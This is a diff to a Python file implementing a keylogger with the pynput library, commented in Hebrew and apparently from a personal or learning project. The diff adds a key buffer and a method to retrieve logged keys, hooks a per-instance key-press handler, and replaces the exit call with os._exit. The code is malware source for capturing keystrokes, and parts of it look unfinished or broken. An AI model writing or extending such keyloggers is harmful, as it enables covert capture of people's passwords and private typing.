@@ -1,6 +1,7 @@
 from abc import ABC,abstractmethod
 from pynput.keyboard import Key,Listener
 import threading
+import os
 
 
 class IKeyLogger(ABC):
@@ -12,12 +13,19 @@ class IKeyLogger(ABC):
     def stop_logging(self) -> None:
         pass
 
+    @abstractmethod
+    def get_logged_keys(self) -> list[str]:
+        pass
+
 
 # קלאס שאחראי על ההקלטה מפעיל הקלטה בהדלקה ראשונה
 class KeyLogger(IKeyLogger):
+
+    def __init__(self):
+        self.arr = list()
     # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
-    @staticmethod
-    def __on_press(Key):
+
+    def __on_press(self,Key):
         key_nise = KeyLogger.nurmal_key(Key)
         print(key_nise)
         # לתקן את הדרך
@@ -55,15 +63,22 @@ class KeyLogger(IKeyLogger):
     #  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
     def start_logging(self):
         def _statr():
-            with Listener(on_press=KeyLogger.__on_press, on_release=self.__on_release) as l:
+            with Listener(on_press=self.__on_press, on_release=self.__on_release) as l:
                 self.lisiner = l
                 self.lisiner.join()
         ran = threading.Thread(target=_statr)
         ran.start()
 
     def stop_logging(self) -> None:
-        sys.exit(0)
+        os._exit(0)
+
+    def get_logged_keys(self) -> list[str]:
+        c = self.arr.copy()
+        self.arr = []
+        return c
+
 
 KeyLogger().start_logging()
+KeyLogger().stop_logging()
 
 
